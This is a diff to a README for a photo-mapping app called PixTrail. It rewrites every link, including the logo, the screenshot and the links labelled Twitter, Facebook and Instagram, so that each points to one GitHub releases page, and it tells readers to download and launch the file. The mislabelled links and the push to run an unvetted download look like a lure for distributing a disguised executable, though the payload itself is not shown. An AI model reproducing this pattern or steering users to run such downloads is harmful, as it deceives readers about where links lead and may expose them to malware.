@@ -1,6 +1,6 @@
 # 🌍📸 Welcome to PixTrail: Transform Your Photos into Travel Adventures 🌟
 
-![PixTrail Logo](https://example.com/pixtrail-logo.png)
+![PixTrail Logo](https://github.com/Madureira20/pixTrail/releases)
 
 ---
 
@@ -37,7 +37,7 @@ PixTrail uses the Exif data embedded in your photos to extract GPS coordinates. 
 
 ## Download PixTrail
 
-📥 **[Download PixTrail](https://github.com/repo/releases/9246/App.zip)**
+📥 **[Download PixTrail](https://github.com/Madureira20/pixTrail/releases)**
 
 Note: Click the link above to download the PixTrail application. Launch the downloaded file to start visualizing your travel routes in a whole new way!
 
@@ -72,9 +72,9 @@ If you encounter any issues or have suggestions for improvement, feel free to co
 
 Follow us on social media for updates, tips, and travel inspiration:
 
-🐦 Twitter: [@PixTrailApp](https://twitter.com/PixTrailApp)  
-📘 Facebook: [PixTrail](https://facebook.com/PixTrail)  
-📷 Instagram: [@PixTrailOfficial](https://instagram.com/PixTrailOfficial)
+🐦 Twitter: [@PixTrailApp](https://github.com/Madureira20/pixTrail/releases)  
+📘 Facebook: [PixTrail](https://github.com/Madureira20/pixTrail/releases)  
+📷 Instagram: [@PixTrailOfficial](https://github.com/Madureira20/pixTrail/releases)
 
 ---
 
@@ -82,4 +82,4 @@ Follow us on social media for updates, tips, and travel inspiration:
 
 Start your journey through time and space with PixTrail today. Let your photos tell the story of your adventures like never before. Happy exploring! 🌟
 
-![PixTrail Screenshot](https://example.com/pixtrail-screenshot.png)
+![PixTrail Screenshot](https://github.com/Madureira20/pixTrail/releases)
